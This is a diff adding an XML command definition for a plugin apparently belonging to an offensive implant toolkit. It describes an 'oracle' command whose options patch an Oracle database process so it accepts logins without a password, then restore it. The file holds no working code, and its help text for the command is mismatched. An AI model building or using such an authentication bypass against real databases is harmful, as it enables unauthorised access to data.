@@ -1,0 +1,35 @@
+﻿<?xml version='1.0'?>
+<Plugin id="31395">
+  <Command id="16" name="oracle">
+    <Help>Returns a list of files in the specified directory</Help>
+    <Input optionprefix="-">
+      <Option name="crc" group="type">
+        <Help>Generate a CRC of a file</Help>
+        <Set data="type" value="1" />
+      </Option>
+      <Option name="open" group="type">
+        <Help>Open up Oracle to login without a password</Help>
+        <Set data="type" value="2" />
+      </Option>
+      <Option name="close" group="type">
+        <Help>Restore Oracle to original functionality</Help>
+        <Set data="type" value="3" />
+      </Option>
+      <Option name="memcheck" group="type">
+        <Help>Perform Oracle memory modification check</Help>
+        <Set data="type" value="4" />
+      </Option>
+      <Option name="file" optional="true">
+        <Argument name="filename" data="filename" />
+      </Option>
+      <Option name="pid" optional="true">
+        <Argument name="processID" data="pid" />
+      </Option>
+    </Input>
+    <Output>
+      <Data name="type" type="uint32_t" default="0" />
+      <Data name="filename" type="string" />
+      <Data name="pid" type="uint32_t" default="0" />
+    </Output>
+  </Command>
+</Plugin>
